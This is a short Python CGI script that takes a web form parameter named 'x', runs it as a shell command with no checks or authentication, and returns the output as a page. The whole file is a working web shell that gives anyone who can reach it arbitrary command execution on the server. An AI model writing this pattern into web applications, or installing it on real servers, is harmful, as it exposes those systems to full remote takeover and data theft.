#!/usr/bin/python3
print("content-type:text/html")
print()

import subprocess as sp
import cgi

form=cgi.FieldStorage()
command=form.getvalue("x")
output=sp.getoutput(command)
print(output)
